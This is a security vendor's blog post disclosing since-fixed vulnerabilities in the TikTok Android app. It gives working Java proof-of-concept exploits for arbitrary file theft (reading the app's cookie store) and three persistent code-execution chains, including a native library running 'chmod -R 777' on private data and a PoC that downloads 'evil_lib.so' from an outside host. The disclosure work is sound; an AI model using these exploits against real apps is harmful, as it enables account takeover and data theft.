---
source: oversecured
source_url: https://oversecured.com/blog/oversecured-detects-dangerous-vulnerabilities-in-the-tiktok-android-app
title: "Oversecured detects dangerous vulnerabilities in the TikTok Android app | Oversecured Blog"
author: "HubSpot, Inc."
description: "Oversecured has once again uncovered high-severity vulnerabilities, this time in the TikTok app. The app contained one vulnerability to theft of arbitrary files with user interaction and three to persistent arbitrary code execution."
---

Dast is live!

Run a new scan to see dynamic findings in your reports

[Learn more →](https://oversecured.com/dast)

Oversecured has once again uncovered high-severity vulnerabilities, this time in the [TikTok](https://play.google.com/store/apps/details?id=com.zhiliaoapp.musically) app. The app contained one vulnerability to theft of arbitrary files with user interaction and three to persistent arbitrary code execution. All these vulnerabilities could have been exploited by a hacker if a user had installed a malicious app onto their Android device. All the vulnerabilities have been removed. Users should update to the latest version on Google Play to enjoy the best experience.

Do you want to check your mobile apps for such types of vulnerabilities? Oversecured mobile apps scanner provides an automatic solution that helps to detect vulnerabilities in Android and iOS mobile apps. You can integrate Oversecured into your development process and check every new line of your code to ensure your users are always protected.

Start securing your apps by starting a free 2-week trial from [Quick Start](https://app.oversecured.com/docs/quick-start/), or you can [book a call](https://calendly.com/oversecured/30min) with our team or [contact us](https://app.oversecured.com/contact-us) to explore more.

## Vulnerability to theft of arbitrary files

Oversecured security researchers scanned the app and discovered the following:

![](https://framerusercontent.com/images/QjALWZ0L7nMAF9zI6dS8bVXF7cY.png?width=2230&height=4236)

It turned out that the activity `com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity` was exported and took an object of class `com.ss.android.ugc.aweme.livewallpaper.model.LiveWallPaperBean` in the `live_wall_paper` key, which was then written to a static field. The app then received `getVideoPath()` from this static field, in the provider `com.ss.android.ugc.aweme.livewallpaper.WallPaperDataProvider`, created a `ParcelFileDescriptor` and returned it to an attacker:

```
public ParcelFileDescriptor openFile(Uri uri, String str) throws FileNotFoundException {
    String str2 = "";
    int match = this.f83988g.match(uri);
    if (match == 16) {
        str2 = C30504c.m104774a().f84038a.getVideoPath();
    }
    //...
    try {
        return ParcelFileDescriptor.open(new File(str2), 268435456);
```

Since the path was fully controllable by the attacker, this provided read-only access to arbitrary files. An attacker could therefore gain access to any files stored in the app’s private directory, and also to history, private messages, and session tokens, resulting in complete access to the user’s account.

### Proof of Concept

```
String theft = "/data/user/0/com.zhiliaoapp.musically/app_webview/Default/Cookies";

LiveWallPaperBean bean = new LiveWallPaperBean();
bean.height = 100;
bean.width = 100;
bean.id = "1337";
bean.source = theft;
bean.thumbnailPath = theft;
bean.videoPath = theft;

Intent intent = new Intent();
intent.setClassName("com.zhiliaoapp.musically", "com.ss.android.ugc.aweme.livewallpaper.ui.LiveWallPaperPreviewActivity");
intent.putExtra("live_wall_paper", bean);
startActivity(intent);

Uri uri = Uri.parse("content://com.zhiliaoapp.musically.wallpapercaller/video_path");
new Handler().postDelayed(() -> {
    try (InputStream inputStream = getContentResolver().openInputStream(uri)) {
        Log.d("evil", IOUtils.toString(inputStream));
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}, 15000);
```

## Persistent arbitrary code execution vulnerabilities

All code execution vulnerabilities were chained from two independent vulnerabilities: rewriting arbitrary files and dynamically loading code from a file. There are two types of native libraries on Android: libraries stored in the app’s resources (`app.apk/lib/...`) and libraries loaded dynamically from files. The first type have owner and group set to `system`, so even the app itself only has read-only access to those files. But the second are usually loaded into the app using a `java.lang.System.load(path)` call and can have arbitrary ownership, which is why developers often choose this approach to load dynamic code. In all three cases, Oversecured researchers discovered three separate libraries that were used to create Proof of Concepts. The vulnerability could have been exploited by an app that was only run once and then, say, deleted. The library would have been written to the app’s private directory and could have been loaded by the app even after the phone was rebooted or the app restarted. All vulnerabilities relating to arbitrary code execution would have lead to the app and its users becoming thoroughly compromised. The PoC we sent to TikTok made it possible to gain access to arbitrary files stored in the private directory, thus providing access to the user’s account as well as their private messages and videos. Moreover, an attacker could do the same things that the TikTok app could based on its permissions: access user pictures and videos stored on the device, audio records and web browser downloads, record audio and video from the user’s microphone and camera without consent when the app is in use, and read contacts. All the data obtained could have been sent to the attacker’s server in the background without the user knowing, and then analyzed.

## Vulnerability via  `NotificationBroadcastReceiver`

![](https://framerusercontent.com/images/am6lPq9INtGl1IiE19kUq3gZ3j8.png?width=2194&height=1748)

Broadcast receiver `com.ss.android.ugc.awemepushlib.receiver.NotificationBroadcastReceiver` is exported and accepts messages from any third-party apps:

```
public void onReceive(Context context, Intent intent) {
    if (context != null && intent != null) {
        //...
        Intent intent2 = (Intent) intent.getParcelableExtra("contentIntentURI");
        if ("notification_clicked".equals(action)) {
            //...
                    context.startActivity(intent2);
```

It also receives an Intent from key `contentIntentURI` and passes it to `startActivity()`. Thus, an attacker gains the ability to launch arbitrary activities with arbitrary data and flag values. As we described in our article on [Access to app protected components](https://blog.oversecured.com/Android-Access-to-app-protected-components/), the attacker can gain access to arbitrary Content Providers with the parameter `android:grantUriPermissions="true"`. A provider like this was discovered in the TikTok app:

```
<provider android:name="android.support.v4.content.FileProvider" android:exported="false" android:authorities="com.zhiliaoapp.musically.fileprovider" android:grantUriPermissions="true">
    <meta-data android:name="android.support.FILE_PROVIDER_PATHS" android:resource="@xml/k86" />
</provider>
```

which makes it possible to obtain read/write access to arbitrary files:

```
<?xml version="1.0" encoding="utf-8"?>
<paths xmlns:amazon="http://schemas.amazon.com/apk/res/android" xmlns:android="http://schemas.android.com/apk/res/android" xmlns:app="http://schemas.android.com/apk/res-auto">
    <root-path name="name" path="" />
    <external-path name="share_path0" path="share/" />
    <external-path name="download_path2" path="Download/" />
    <cache-path name="gif" path="gif/" />
    <external-files-path name="share_path1" path="share/" />
    <external-files-path name="install_path" path="update/" />
    <external-cache-path name="share_image_path0" path="picture/" />
    <external-cache-path name="share_image_path2" path="head/" />
    <external-cache-path name="share_image_path3" path="feedback/" />
    <external-cache-path name="share_image_path4" path="tmpimages/" />
    <cache-path name="share_image_path1" path="picture/" />
    <cache-path name="share_image_path3" path="head/" />
    <cache-path name="share_image_path4" path="tmpimages/" />
</paths>
```

using path `<root-path name="name" path="" />`. The attacker can generate a URI like`content://com.zhiliaoapp.musically.fileprovider/name/data/user/0/com.zhiliaoapp.musically/etc`to access arbitrary protected files belonging to the app.

We then discovered a large number of references to native libraries in the app’s code. The most interesting point is that these native libraries are often not even used by the app. In these cases they create a predefined path to the library (for example, `/data/user/0/app_package/files/lib.so`) and verify its existence using `File.exists()`, calling `System.load(path)` if it does exist. That is just what we found in the case of TikTok: a large number of references to libraries that the app was not using and that an attacker would have needed to write a pre-created file to a predefined path in the TikTok app’s private directory.

In this case we studied the app’s scan report once again, specifically the `Dynamic code loading` section, and found a lot of references in the app:

![](https://framerusercontent.com/images/86wCrDUt3Sqw11C177pHSHob8.png?width=2218&height=6458)

For this PoC we selected a library located at the path `/data/user/0/com.zhiliaoapp.musically/lib-main/libimagepipeline.so`.

### Proof of Concept

The attacker needs to create a native library in advance (e.g. by compiling their app and extracting the library from it), using the following code fragment:

```
#include <jni.h>
#include <string.h>
#include <stdlib.h>

JNIEXPORT jint JNI_OnLoad(JavaVM* vm, void* reserved) {
    system("chmod -R 777 /data/user/0/com.zhiliaoapp.musically/");

    JNIEnv* env;
    if (vm->GetEnv(reinterpret_cast<void**>(&env), JNI_VERSION_1_6) != JNI_OK) {
        return JNI_ERR;
    }
    return JNI_VERSION_1_6;
}
```

When the library is loaded to `System.load(path)` the command `chmod -R 777 /data/user/0/com.zhiliaoapp.musically/` is executed and changes file rights from private to world-readable/writable.

Code in the attacker’s app:

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    handleIntent(getIntent());
}

protected void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    handleIntent(intent);
}

private void handleIntent(Intent i) {
    if (!"evil".equals(i.getAction())) {
        Intent next = new Intent("evil");
        next.setClass(this, getClass());
        next.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        next.setData(Uri.parse("content://com.zhiliaoapp.musically.fileprovider/name/data/user/0/com.zhiliaoapp.musically/lib-main/libimagepipeline.so"));

        Intent intent = new Intent("notification_clicked");
        intent.setClassName("com.zhiliaoapp.musically", "com.ss.android.ugc.awemepushlib.os.receiver.NotificationBroadcastReceiver");
        intent.putExtra("contentIntentURI", next);
        sendBroadcast(intent);
    } else {
        try (InputStream inputStream = getAssets().open("evil_lib.so")) {
            try (OutputStream outputStream = getContentResolver().openOutputStream(i.getData()) {
                IOUtils.copy(inputStream, outputStream);
            }
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}
```

When TikTok is launched next, and on all subsequent occasions, it will automatically load the specified library and execute the code contained in it, leading to persistent arbitrary code execution.

## Vulnerability via `DetailActivity`

![](https://framerusercontent.com/images/ZAWZVJKijZTbJUFf5YHKN6JzwC4.png?width=2246&height=1880)

Activity `com.ss.android.ugc.aweme.detail.ui.DetailActivity` is exported and receives an external Intent via the `VENDOR_BACK_INTENT_FOR_INTENT_KEY` parameter:

```
Intent intent;
if (!C40319c.m140001c() || (intent = (Intent) getIntent().getParcelableExtra("VENDOR_BACK_INTENT_FOR_INTENT_KEY")) == null || intent.resolveActivity(getPackageManager()) == null) {
    if (this.f71512i) {
        C23135h.m87141a("back", C20358d.m78056a().mo59787a("enter_from", "poi_video_leaderboard").mo59787a("previous_page", this.f71513j).f63101a);
    }
```

it then passes the object it receives to `startActivity()` when the phone’s Back button is pressed

```
        C40278az.m139806a(new C25835an(42));
        return;
    }
    startActivity(intent);
    finish();
}
```

As in the previous PoC, we used the provider `com.zhiliaoapp.musically.fileprovider` to write arbitrary files to the library at `/data/user/0/com.zhiliaoapp.musically/app_librarian/14.7.5.6172264464/libAkeva.so`

### Proof of Concept

The code to generate the native library is the same. The Java code for the attacker’s app:

```
protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    handle(getIntent());
}

protected void onNewIntent(Intent intent) {
    super.onNewIntent(intent);
    handle(intent);
}

private void handle(Intent i) {
    if (!"evil".equals(i.getAction())) {
        Intent next = new Intent("evil");
        next.setClass(this, getClass());
        next.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        next.setData(Uri.parse("content://com.zhiliaoapp.musically.fileprovider/name/data/user/0/com.zhiliaoapp.musically/app_librarian/14.7.5.6172264464/libAkeva.so"));

        Intent intent = new Intent();
        intent.setClassName("com.zhiliaoapp.musically", "com.ss.android.ugc.aweme.detail.ui.DetailActivity");
        intent.putExtra("VENDOR_BACK_INTENT_FOR_INTENT_KEY", next);
        intent.putExtra("id", "123");
        startActivity(intent);
    } else {
        try (InputStream inputStream = getAssets().open("evil_lib.so")) {
            try (OutputStream outputStream = getContentResolver().openOutputStream(i.getData())) {
                IOUtils.copy(inputStream, outputStream);
            }
        } catch (Throwable th) {
            throw new RuntimeException(th);
        }
    }
}
```

## Vulnerability via `IndependentProcessDownloadService`  AIDL interface

The app also included an unprotected service `com.ss.android.socialbase.downloader.downloader.IndependentProcessDownloadService`, which returned a binder object in the file `com/ss/android/socialbase/downloader/downloader/DownloadService.java`:

```
if (this.downloadServiceHandler != null) {
    return this.downloadServiceHandler.onBind(intent);
}
```

allowing the attacker to call arbitrary methods belonging to this interface. One of the methods available is `tryDownload`, which takes a URL for file download, a file name, and a save path. To exploit this vulnerability successfully, an attacker would have needed to create an object of class `com.ss.android.socialbase.downloader.model.DownloadInfo` and write the necessary values to it, then pack it to `com.ss.android.socialbase.downloader.model.DownloadTask` and use app code via the Reflection API to convert it into the right format for passing via AIDL.

### Proof of concept

```
static final String url = "https://redacted.s3.amazonaws.com/evil_lib.so";
static final String path = "/data/user/0/com.zhiliaoapp.musically/app_lib/";
static final String name = "libuserinfo.so";

private ServiceConnection mServiceConnection = new ServiceConnection() {
    public void onServiceConnected(ComponentName cName, IBinder service) {
        processBinder(service);
    }

    public void onServiceDisconnected(ComponentName cName) {
    }
};

public static ClassLoader getForeignClassLoader(Context context, String str) throws Exception {
    return context.createPackageContext(str, Context.CONTEXT_INCLUDE_CODE | Context.CONTEXT_IGNORE_SECURITY)
    	.getClassLoader();
}

protected void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);

    Intent intent = new Intent("com.ss.android.socialbase.downloader.remote");
    intent.setClassName("com.zhiliaoapp.musically", "com.ss.android.socialbase.downloader.downloader.IndependentProcessDownloadService");
    bindService(intent, mServiceConnection, BIND_AUTO_CREATE);
}

private void processBinder(IBinder binder) {
    try {
        ClassLoader cl = getForeignClassLoader(this, "com.zhiliaoapp.musically");
        Object handler = cl.loadClass("com.ss.android.socialbase.downloader.downloader.i$a")
                .getMethod("asInterface", IBinder.class)
                .invoke(null, binder);

        Object payload = getBinder(cl);

        cl.loadClass("com.ss.android.socialbase.downloader.downloader.i")
                .getMethod("tryDownload", cl.loadClass("com.ss.android.socialbase.downloader.model.a"))
                .invoke(handler, payload);
    } catch (Throwable th) {
        throw new RuntimeException(th);
    }
}

private Object getBinder(ClassLoader cl) throws Throwable {
    Class utilsClass = cl.loadClass("com.ss.android.socialbase.downloader.utils.g");
    Class taskClass = cl.loadClass("com.ss.android.socialbase.downloader.model.DownloadTask");
    return utilsClass.getDeclaredMethod("convertDownloadTaskToAidl", taskClass)
            .invoke(null, getDownloadTask(taskClass, cl));
}

private Object getDownloadTask(Class taskClass, ClassLoader cl) throws Throwable {
    Class infoClass = cl.loadClass("com.ss.android.socialbase.downloader.model.DownloadInfo");
    Object info = getDownloadInfo(infoClass, cl);
    return taskClass.getDeclaredConstructor(infoClass).newInstance(info);
}

private Object getDownloadInfo(Class infoClass, ClassLoader cl) throws Throwable {
    Object info = infoClass.newInstance();

    Field field;

    field = infoClass.getDeclaredField("url");
    field.setAccessible(true);
    field.set(info, url);

    field = infoClass.getDeclaredField("savePath");
    field.setAccessible(true);
    field.set(info, path);

    field = infoClass.getDeclaredField("name");
    field.setAccessible(true);
    field.set(info, name);

    field = infoClass.getDeclaredField("enqueueType");
    field.setAccessible(true);
    field.set(info, cl.loadClass("com.ss.android.socialbase.downloader.constants.EnqueueType").getEnumConstants()[1]);

    return info;
}
```

## Conclusion

Dangerous vulnerabilities can be found even in the most popular apps, such as TikTok. Oversecured aims to help developers correct all vulnerabilities in their apps. We are glad we could make TikTok more secure, and we are grateful to the TikTok team for their responsiveness, their quick reaction, and their help in uncovering the vulnerabilities.

##### Keep reading

[View all](https://oversecured.com/blog)

[![](https://framerusercontent.com/images/OnN0UKCOhnnXin2eBts9J3SaUQ.png?width=5592&height=3259)\\
\\
20 Security Issues Found in Xiaomi Devices\\
\\
Oversecured found and resolved significant mobile security vulnerabilities in Xiaomi devices. Our team discovered 20 dangerous vulnerabilities across various applications and system components that pose a threat to all Xiaomi users. The vulnerabilities\\
\\
Case Study\\
\\
May 2, 2024\\
\\
15\\
\\
min read\\
\\
TOp article](https://oversecured.com/blog/20-security-issues-found-in-xiaomi-devices)

[![](https://framerusercontent.com/images/W9Wn9vbZPPJFNH7MN7Zx6QXches.png?width=2048&height=1194)\\
\\
Android deep link vulnerabilities: how intent filters lead to account takeover\\
\\
A technical guide to Android deep link security. Learn how intent filter misconfigurations lead to account takeover, and how mobile application security testing with SAST and DAST finds these vulnerability chains.\\
\\
Android Security\\
\\
Apr 27, 2026\\
\\
8\\
\\
min read](https://oversecured.com/blog/android-deep-link-vulnerabilities)

[![](https://framerusercontent.com/images/xSiSLs1y7y6Mzr4lWYWCpFoYmM4.png?width=2848&height=1656)\\
\\
Android security checklist: theft of arbitrary files\\
\\
Developers for Android do a lot of work with files and exchange them with other apps, for example, to get photos, images, or user data. \\
\\
Android Security\\
\\
May 20, 2022\\
\\
11\\
\\
min read\\
\\
TOp article](https://oversecured.com/blog/android-security-checklist-theft-of-arbitrary-files)

Book a personalized demo

During the demo with our cybersecurity experts you will get:

A free trial scan of your app

An analysis of your SAST and DAST findings

Practical insights on mobile security of your app

First name

Business email

How did you hear about us?

Book a demo

[Blog](https://oversecured.com/blog)

[Partner](https://oversecured.com/partner)

[Wall of fame](https://oversecured.com/cve)

2026 © Oversecured

follow us

### [LinkedIn](https://www.linkedin.com/company/oversecured/)

### [Twitter (X)](https://x.com/oversecuredinc)

[Privacy Policy](https://oversecured.com/privacy)

[Terms of use](https://oversecured.com/terms)

[go up ↑](https://oversecured.com/blog/oversecured-detects-dangerous-vulnerabilities-in-the-tiktok-android-app#header)

Chat Widget